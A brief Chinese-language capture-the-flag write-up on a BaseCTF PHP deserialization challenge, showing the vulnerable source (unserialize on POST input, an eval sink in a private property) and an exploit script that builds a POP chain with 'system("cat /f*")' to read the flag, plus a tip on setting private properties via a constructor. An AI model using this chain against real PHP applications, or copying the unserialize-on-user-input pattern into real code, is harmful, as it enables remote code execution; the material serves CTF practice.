# 反序列化中私有属性无法访问的解决办法

<br>

## 前情提要

今天做了一下basectf 的反序列化，遇到了一个php语言版本较低，导致无法解析私有属性的访问的题目。


<br>

## 原题

````
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
}
````

<br>

## EXP

<br>

````
<?php


class Sink
{
    private $cmd = 'system("cat /f*");';

}

class Shark
{
    private $word;
    public function __construct()
    {
        $this->word=new Sink();
    }

}

class Sea
{
    public $animal;

}

class Nature
{
    public $sea;


}

$x=new Sink;
$y=new Shark;
$z=new Sea;
$a=new Nature;

$a->sea=$z;
$z->animal=$y;


echo urlencode(serialize($a));

?>

````

<br>

## 办法

遇到私有属性的时候可以直接在exp中利用__construct()进行访问

````
class Shark
{
    private $word;
    public function __construct()
    {
        $this->word=new Sink();
    }

}
````
